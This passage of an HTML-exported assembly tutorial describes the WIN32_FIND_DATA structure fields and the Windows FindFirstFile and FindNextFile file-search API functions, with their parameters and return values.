color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_ftLastWriteTime<span style="mso-spacerun: yes">     </span>FILETIME
?<span style="mso-spacerun: yes">   </span>&lt;-- Last time when file was
written<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_nFileSizeHigh<span style="mso-spacerun: yes">       </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">   
</span>&lt;-- MSD of file size<span style="mso-spacerun: yes">                
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_nFileSizeLow<span style="mso-spacerun: yes">        </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">   
</span>&lt;-- LSD of file size<span style="mso-spacerun: yes">                
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_dwReserved0<span style="mso-spacerun: yes">         </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">   
</span>&lt;-- Reserved<span style="mso-spacerun: yes">                        
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_dwReserved1<span style="mso-spacerun: yes">         </span>dd<span
style="mso-spacerun: yes">      </span>?<span style="mso-spacerun: yes">   
</span>&lt;-- Reserved<span style="mso-spacerun: yes">                  
</span><span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_szFileName<span style="mso-spacerun: yes">          </span>db<span
style="mso-spacerun: yes">      </span>MAX_PATH dup (?) &lt;-- ASCIIz file
name<span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WFD_szAlternateFileName db<span style="mso-spacerun: yes">     
</span>13 dup (?) &lt;-- File name without path<span style="mso-spacerun:
yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                           </span>db<span style="mso-spacerun: yes">     
</span>03 dup (?) &lt;-- Padding<span style="mso-spacerun:
yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>WIN32_FIND_DATA<span style="mso-spacerun: yes">         </span>ENDS<span
style="mso-spacerun: yes">                                              </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwFileAttributes: Specifies the file attributes of the file found.This
member can be one or more of the following values [Not enough<span
style="mso-spacerun: yes">  </span>space for include them here:you have them at
29A INC files (29A#2) and<span style="mso-spacerun: yes">      </span>the
document said before.]<span style="mso-spacerun: yes">                                             
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>ftCreationTime: Specifies a FILETIME structure containing the time the
file was created. FindFirstFile and<span style="mso-spacerun: yes"> 
</span>FindNextFile report file times in<span style="mso-spacerun: yes"> 
</span>Coordinated Universal Time (UTC) format. These functions set the<span
style="mso-spacerun: yes">         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>FILETIME members to zero if the file system containing the file does not
support this time member. You can use the FileTimeToLocalFileTime<span
style="mso-spacerun: yes">  </span>function to convert from UTC to local time,
and then use the<span style="mso-spacerun: yes">            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>FileTimeToSystemTime function to convert da local time to a SYSTEMTIME structure<span
style="mso-spacerun: yes">  </span>containing individual<span
style="mso-spacerun: yes">  </span>members<span style="mso-spacerun: yes"> 
</span>for<span style="mso-spacerun: yes">  </span>the month, day, year,<span
style="mso-spacerun: yes">   </span>weekday, hour, minute, second, and
millisecond.<span style="mso-spacerun: yes">                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>ftLastAccessTime: Specifies a FILETIME structure containing the time
that the file was last accessed.The time is in UTC format the FILETIME<span
style="mso-spacerun: yes">  </span>members are zero if the file system does not
support this time member.<span style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                       
</span><span style="mso-spacerun: yes">     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>ftLastWriteTime: Specifies a FILETIME structure containing the time that
da file was last written to.Da time is in UTC format the FILETIME members are
zero if the file system does not support this time member.<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                  </span><span style="mso-spacerun:
yes">                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>nFileSizeHigh: Specifies the high-order DWORD value of the file size, in
bytes. This value is zero unless the file size is greater than MAXDWORD. The
size of the file is equal to (nFileSizeHigh * MAXDWORD)<span
style="mso-spacerun: yes">  </span>+ nFileSizeLow.<span style="mso-spacerun:
yes">                                                         </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>nFileSizeLow: Specifies the low-order DWORD value of the file size,
in<span style="mso-spacerun: yes">   </span>bytes.<span style="mso-spacerun:
yes">                       </span><span style="mso-spacerun:
yes">                                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwReserved0: Reserved for future use.<span style="mso-spacerun:
yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                         </span><span
style="mso-spacerun: yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>dwReserved1: Reserved for future use.<span style="mso-spacerun:
yes">                                   </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>cFileName: A null-terminated string that is the name of the file.<span
style="mso-spacerun: yes">       </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span><span style="mso-spacerun:
yes">                                                                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>cAlternateFileName: A null-terminated string that is an alternative name
for the file.This name is in the classic 8.3 (filename.ext) filename
format.<span style="mso-spacerun: yes">                            </span><span
style="mso-spacerun: yes">                                  </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Well, as we know now the fields of the WFD structure, we can take a deep
look to &quot;Find&quot; functions of Windows. First, let's see the description
of<span style="mso-spacerun: yes">   </span>the API FindFirstFileA:<span
style="mso-spacerun: yes">                                                  
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------
<span style="mso-spacerun:
yes">                                                                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>The FindFirstFile function searches a directory for a file whose name
matches the specified filename.FindFirstFile examines subdirectory names<span
style="mso-spacerun: yes">   </span>as well as filenames.<span
style="mso-spacerun: yes">               </span><span style="mso-spacerun:
yes">                                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>HANDLE FindFirstFile(<span style="mso-spacerun:
yes">                                                     </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPCTSTR lpFileName,<span style="mso-spacerun: yes">  </span>// pointer
to name of file to search for<span style="mso-spacerun: yes">           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPWIN32_FIND_DATA lpFindFileData<span style="mso-spacerun: yes">   
</span>// pointer to returned information<span style="mso-spacerun: yes"> 
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Parameters<span style="mso-spacerun:
yes">                                                                </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFileName: A. Windows 95: Points to a null-terminated string that
specifies a valid directory or path and filename, which<span
style="mso-spacerun: yes">  </span>can contain wildcard characters (* and ?).
This string must not exceed MAX_PATH characters.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes"> </span>B. Windows NT: Points<span style="mso-spacerun: yes">  </span>to a
null-terminated string that specifies a valid directory or path and filename,
which can contain wildcard characters (* and ?).<span style="mso-spacerun:
yes">               </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                </span><span
style="mso-spacerun: yes">                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>There is a default string size limit for paths of MAX_PATH characters.
This limit is related to how the FindFirstFile function<span
style="mso-spacerun: yes">  </span>parses<span style="mso-spacerun: yes"> 
</span>paths. An application can transcend this limit and send in paths longer
than<span style="mso-spacerun: yes">     </span>MAX_PATH characters by calling
the wide (W) version of FindFirstFile and prepending &quot;\\?\&quot; to<span
style="mso-spacerun: yes">  </span>the path.The &quot;\\?\&quot; tells the
function to turn off path parsing<span style="mso-spacerun: yes">  </span>it
lets paths longer than MAX_PATH be used with<span style="mso-spacerun: yes"> 
</span>FindFirstFileW. This also works with UNC names. The &quot;\\?\&quot; is
ignored as part of the path. For example &quot;\\?\C:\myworld\private&quot; is
seen as “C:\myworld\private&quot;, and
&quot;\\?\UNC\bill_g_1\hotstuff\coolapps&quot;is seen as<span
style="mso-spacerun: yes">  </span>&quot;\\bill_g_1\hotstuff\coolapps&quot;<span
style="mso-spacerun: yes">                                            </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                     </span><span style="mso-spacerun:
yes">                                                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>lpFindFileData: Points to the WIN32_FIND_DATA structure that receives
information about the found file or subdirectory. The structure can be used in
subsequent calls to the FindNextFile or FindClose function to<span
style="mso-spacerun: yes">  </span>refer to the file or subdirectory.<span
style="mso-spacerun: yes">                                      </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>Return Values<span style="mso-spacerun:
yes">                                                             </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>If the function succeeds,the return value is a search handle used in a
subsequent call to FindNextFile or FindClose.<span style="mso-spacerun:
yes">                           </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>If the function fails, the return value is INVALID_HANDLE_VALUE.To get
extended error information, call GetLastError.<span style="mso-spacerun:
yes">                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'>----------------------------------------------------------------------------------------------<span
style="mso-spacerun:
yes">                                                                      
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes"> 
</span>The FindNextFile function continues a file search from a previous
call<span style="mso-spacerun: yes">   </span>to the FindFirstFile
function.<span style="mso-spacerun: yes">                  </span><span
style="mso-spacerun: yes">                          </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                                                            
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">  
</span>BOOL FindNextFile(<span style="mso-spacerun:
yes">                                                        </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>HANDLE hFindFile,<span style="mso-spacerun: yes">   </span>// handle to
search<span style="mso-spacerun: yes">                             </span><span
style="mso-spacerun: yes">    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">    
</span>LPWIN32_FIND_DATA lpFindFileData<span style="mso-spacerun: yes">   
</span>// pointer to structure for data<span style="mso-spacerun: yes">   
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                                         </span>// on found file<span
style="mso-spacerun: yes">                    </span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun: yes">   
</span>)<span style="mso-spacerun:
yes">                                                                       
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
